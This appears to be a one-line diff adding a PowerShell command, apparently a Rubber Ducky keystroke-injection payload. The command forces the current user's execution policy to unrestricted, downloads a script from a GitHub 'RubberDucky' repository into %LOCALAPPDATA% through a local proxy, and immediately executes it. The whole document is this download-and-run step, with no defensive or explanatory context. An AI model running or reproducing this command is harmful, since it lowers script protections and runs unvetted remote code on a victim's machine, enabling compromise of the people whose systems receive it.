@@ -1,0 +1,1 @@
+powershell -c "Set-executionpolicy unrestricted -force -Scope currentuser; curl -proxy "http://127.0.0.1:8080" "https://raw.githubusercontent.com/jerfe/RubberDucky/main/test.ps1" -outfile "$env:LOCALAPPDATA/t.ps1";&"$env:LOCALAPPDATA/t.ps1""
